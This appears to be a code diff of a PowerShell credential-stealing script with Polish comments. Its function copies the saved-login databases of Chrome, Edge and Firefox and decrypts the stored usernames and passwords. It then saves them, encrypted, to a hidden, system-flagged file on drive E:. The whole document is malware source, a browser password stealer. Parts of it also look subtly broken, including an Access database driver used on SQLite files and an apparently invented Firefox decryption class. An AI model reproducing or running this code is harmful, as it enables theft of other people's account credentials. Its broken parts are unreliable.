@@ -1,121 +1,177 @@
-# Ekstrakcja danych przeglądarek
-$browserData = @()
+function Extract-BrowserData {
+    $browserData = @()
 
+    # Chrome
     $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
     if (Test-Path $chromePath) {
         try {
-            # Otwarcie bazy danych Chrome
-            Add-Type -Path "E:\System.Data.SQLite.dll"
-            $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-            $connection.ConnectionString = "Data Source=$chromePath"
+            $tempPath = [System.IO.Path]::GetTempFileName()
+            Copy-Item $chromePath $tempPath -Force
+            
+            $connectionString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempPath;"
+            $connection = New-Object System.Data.OleDb.OleDbConnection($connectionString)
             $connection.Open()
-
+            
             $query = "SELECT origin_url, username_value, password_value FROM logins"
-            $command = $connection.CreateCommand()
-            $command.CommandText = $query
-            $result = $command.ExecuteReader()
-
-            $decryptedPasswords = @()
-            while ($result.Read()) {
-                # Odszyfrowanie hasła (DPAPI)
-                $encryptedBytes = $result.GetValue(2)
-                $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                    $encryptedBytes,
-                    $null,
-                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-                )
-                $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+            $command = New-Object System.Data.OleDb.OleDbCommand($query, $connection)
+            $reader = $command.ExecuteReader()
+            
+            $chromePasswords = @()
+            while ($reader.Read()) {
+                $encryptedBytes = $reader.GetValue(2)
+                try {
+                    $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                        $encryptedBytes,
+                        $null,
+                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+                    )
+                    $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+                }
+                catch {
+                    $password = "[DECRYPTION_FAILED]"
+                }
                 
-                $decryptedPasswords += [PSCustomObject]@{
-                    URL = $result.GetString(0)
-                    Username = $result.GetString(1)
+                $chromePasswords += [PSCustomObject]@{
+                    URL = $reader.GetString(0)
+                    Username = $reader.GetString(1)
                     Password = $password
+                    Browser = "Chrome"
                 }
             }
-            
-            $browserData += @{
-                Browser = "Chrome"
-                Passwords = $decryptedPasswords
-            }
+            $browserData += $chromePasswords
         }
         catch {
-            Write-Error "Błąd ekstrakcji Chrome: $_"
+            $browserData += [PSCustomObject]@{
+                Browser = "Chrome"
+                Error = $_.Exception.Message
+            }
         }
         finally {
             if ($connection) { $connection.Close() }
+            if (Test-Path $tempPath) { Remove-Item $tempPath -Force }
         }
     }
 
-    # Edge (podobny mechanizm jak Chrome)
+    # Microsoft Edge (Chromium)
     $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
     if (Test-Path $edgePath) {
-       try {
-            # Otwarcie bazy danych Chrome
-            Add-Type -Path "E:\System.Data.SQLite.dll"
-            $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-            $connection.ConnectionString = "Data Source=$chromePath"
+        try {
+            $tempPath = [System.IO.Path]::GetTempFileName()
+            Copy-Item $edgePath $tempPath -Force
+            
+            $connectionString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempPath;"
+            $connection = New-Object System.Data.OleDb.OleDbConnection($connectionString)
             $connection.Open()
-
+            
             $query = "SELECT origin_url, username_value, password_value FROM logins"
-            $command = $connection.CreateCommand()
-            $command.CommandText = $query
-            $result = $command.ExecuteReader()
-
-            $decryptedPasswords = @()
-            while ($result.Read()) {
-                # Odszyfrowanie hasła (DPAPI)
-                $encryptedBytes = $result.GetValue(2)
-                $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                    $encryptedBytes,
-                    $null,
-                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-                )
-                $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+            $command = New-Object System.Data.OleDb.OleDbCommand($query, $connection)
+            $reader = $command.ExecuteReader()
+            
+            $edgePasswords = @()
+            while ($reader.Read()) {
+                $encryptedBytes = $reader.GetValue(2)
+                try {
+                    $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
+                        $encryptedBytes,
+                        $null,
+                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+                    )
+                    $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+                }
+                catch {
+                    $password = "[DECRYPTION_FAILED]"
+                }
                 
-                $decryptedPasswords += [PSCustomObject]@{
-                    URL = $result.GetString(0)
-                    Username = $result.GetString(1)
+                $edgePasswords += [PSCustomObject]@{
+                    URL = $reader.GetString(0)
+                    Username = $reader.GetString(1)
                     Password = $password
+                    Browser = "Microsoft Edge"
                 }
             }
-            
-            $browserData += @{
-                Browser = "Chrome"
-                Passwords = $decryptedPasswords
-            }
+            $browserData += $edgePasswords
         }
         catch {
-            Write-Error "Błąd ekstrakcji Chrome: $_"
+            $browserData += [PSCustomObject]@{
+                Browser = "Microsoft Edge"
+                Error = $_.Exception.Message
+            }
         }
         finally {
             if ($connection) { $connection.Close() }
+            if (Test-Path $tempPath) { Remove-Item $tempPath -Force }
         }
-
     }
 
-# Firefox
     # Firefox
     $ffProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory
     foreach ($profile in $ffProfiles) {
         $loginsPath = Join-Path $profile.FullName "logins.json"
-        if (Test-Path $loginsPath) {
+        $keyPath = Join-Path $profile.FullName "key4.db"
+        
+        if (Test-Path $loginsPath -and Test-Path $keyPath) {
             try {
-                $jsonContent = Get-Content $loginsPath -Raw | ConvertFrom-Json
-                $browserData += @{
-                    Browser = "Firefox"
-                    Profile = $profile.Name
-                    Logins = $jsonContent.logins
+                # Pobierz klucz główny Firefox
+                $nssPath = "$env:ProgramFiles\Mozilla Firefox\nss3.dll"
+                if (-not (Test-Path $nssPath)) {
+                    $nssPath = "${env:ProgramFiles(x86)}\Mozilla Firefox\nss3.dll"
+                }
+                
+                if (Test-Path $nssPath) {
+                    Add-Type -Path $nssPath
+                    
+                    $loginsJson = Get-Content $loginsPath -Raw | ConvertFrom-Json
+                    $ffPasswords = @()
+                    
+                    foreach ($login in $loginsJson.logins) {
+                        try {
+                            $decryptedUser = [Mozilla.Pkix]::Decrypt($login.encryptedUsername)
+                            $decryptedPass = [Mozilla.Pkix]::Decrypt($login.encryptedPassword)
+                            
+                            $ffPasswords += [PSCustomObject]@{
+                                URL = $login.hostname
+                                Username = $decryptedUser
+                                Password = $decryptedPass
+                                Browser = "Firefox"
+                                Profile = $profile.Name
+                            }
+                        }
+                        catch {
+                            $ffPasswords += [PSCustomObject]@{
+                                URL = $login.hostname
+                                Username = "[DECRYPTION_FAILED]"
+                                Password = "[DECRYPTION_FAILED]"
+                                Browser = "Firefox"
+                                Profile = $profile.Name
+                            }
+                        }
+                    }
+                    $browserData += $ffPasswords
                 }
             }
             catch {
-                Write-Error "Błąd ekstrakcji Firefox: $_"
+                $browserData += [PSCustomObject]@{
+                    Browser = "Firefox"
+                    Profile = $profile.Name
+                    Error = $_.Exception.Message
+                }
             }
         }
     }
 
     # Eksport zaszyfrowanych danych
-    $encryptedBrowserData = Encrypt-Data -Data ($browserData | ConvertTo-Json -Depth 5)
+    $jsonData = $browserData | ConvertTo-Json -Depth 5
+    $encryptedData = Encrypt-Data -Data $jsonData
     $outputPath = "E:\BrowserData_$(Get-Date -Format 'yyyyMMdd_HHmmss').enc"
-    $encryptedBrowserData | Out-File $outputPath
+    $encryptedData | Out-File $outputPath
     attrib +s +h $outputPath
+    
+    return $outputPath
+}
+
+# Funkcja pomocnicza do szyfrowania (musi być dostępna w zakresie)
+function Encrypt-Data {
+    param($Data)
+    $secure = ConvertTo-SecureString $Data -AsPlainText -Force
+    return ConvertFrom-SecureString $secure
 }
